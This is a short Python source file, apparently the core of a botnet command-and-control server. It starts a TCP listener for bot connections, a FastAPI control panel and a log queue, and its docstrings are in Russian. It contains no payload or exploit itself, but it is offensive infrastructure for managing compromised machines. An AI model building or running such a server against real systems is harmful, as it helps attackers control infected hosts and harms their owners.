# backend/Core/Server.py
import asyncio, multiprocessing, webbrowser, logs.LoggerWrapper as logger
from backend import IP, PORT, API_PORT, start_benchmark
from backend.API import run_fastapi_server
from .ClientConnection import BotConnectionHandler

class C2Server:
    "Управление жизненным циклом TCP сервера и API"
    def __init__(self): self.log_queue, self.server = multiprocessing.Queue(), None

    async def start(self):
        "Запуск TCP сервера, FastAPI и мониторинга"
        handler = BotConnectionHandler()
        self.server = await asyncio.start_server(handler.handle_new_connection, IP, PORT, reuse_address=True, backlog=1000, limit=5242880)
        logger.Log.info(f"[C2] TCP Started: {self.server.sockets[0].getsockname()}")
        log_task, api_task = asyncio.create_task(logger.Log.start_queue_listener(self.log_queue)), asyncio.create_task(run_fastapi_server(IP, API_PORT))
        start_benchmark(asyncio.get_running_loop()); webbrowser.open(f"http://{IP}:{API_PORT}/")
        async with self.server:
            try: await asyncio.gather(self.server.serve_forever(), log_task, api_task)
            except asyncio.CancelledError: logger.Log.warning("[C2] Shutdown initiated...")
            finally:
                self.log_queue.put("STOP"); api_task.cancel()
                await asyncio.gather(log_task, api_task, return_exceptions=True)
                logger.Log.info("[C2] Server stopped.")

async def start_server(): 
    "Точка входа запуска"
    await C2Server().start()